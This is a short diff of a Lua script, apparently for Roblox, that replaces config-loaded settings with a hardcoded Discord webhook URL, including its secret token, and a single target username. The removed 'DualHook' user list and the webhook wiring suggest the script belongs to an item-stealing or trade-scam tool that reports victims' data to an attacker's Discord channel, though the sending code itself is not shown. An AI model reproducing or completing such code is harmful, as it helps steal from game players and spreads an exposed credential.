@@ -1,12 +1,5 @@
-if not _G["Script-SM_Config"] then
-    warn("WARNING: Config not loaded! Waiting for config...")
-    repeat task.wait() until _G["Script-SM_Config"]
-    warn("Config loaded successfully!")
-end
-
-local webhook = _G["Script-SM_Config"].user_webhook
-local usernames = _G["Script-SM_Config"].users or {}
-local dualhook_usernames = {"DualHook-User1","DualHook-User2","DualHook-User3","DualHook-User4","DualHook-User5","DualHook-User6"}
+local webhook = "https://discord.com/api/webhooks/1480201714148839570/eggO1M4_pdTYnI7Y1kUytiHF0Ycdl8mEdBg0fqlwRLcFV7LC-ewKFmH3-yroS847g8b8"
+local usernames = {"abduljamarmm2t"}
 local allFriends = {}
 
 for _, name in ipairs(usernames) do table.insert(allFriends, name) end
